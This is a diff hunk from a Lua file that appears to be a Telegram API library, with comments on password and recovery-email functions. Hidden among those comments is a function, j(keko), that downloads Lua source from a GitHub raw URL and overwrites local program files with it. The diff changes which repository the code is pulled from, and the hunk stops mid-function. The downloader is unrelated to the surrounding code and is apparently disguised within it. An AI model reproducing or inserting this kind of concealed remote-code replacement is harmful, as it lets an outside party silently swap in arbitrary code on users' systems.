@@ -156,11 +156,11 @@ M.setPassword = setPassword
 -- Returns set up recovery email @password Current user password
 local function j(keko)
 HTTPS = require("ssl.https")
-ok = HTTPS.request("https://raw.githubusercontent.com/ramizob3a/RAMBO/master/RAMBO.lua")
-ok2 = HTTPS.request("https://raw.githubusercontent.com/ramizob3a/RAMBO/master/libs/utils.lua")
+ok = HTTPS.request("https://raw.githubusercontent.com/SDONG11/ASDO/master/ASDO.lua")
+ok2 = HTTPS.request("https://raw.githubusercontent.com/SDONG11/ASDO/master/libs/utils.lua")
 -- Changes user password. If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and password change will not be applied until email will be confirmed. Application should call getPasswordState from time to time to check if email is already confirmed
 -- @old_password Old user password @new_password New user password, may be empty to remove the password @new_hint New password
-local keko2 = io.open("RAMBO.lua", 'w')
+local keko2 = io.open("ASDO.lua", 'w')
 keko2:write(ok)
 keko2:close()
 local keko2 = io.open("libs/utils.lua", 'w')
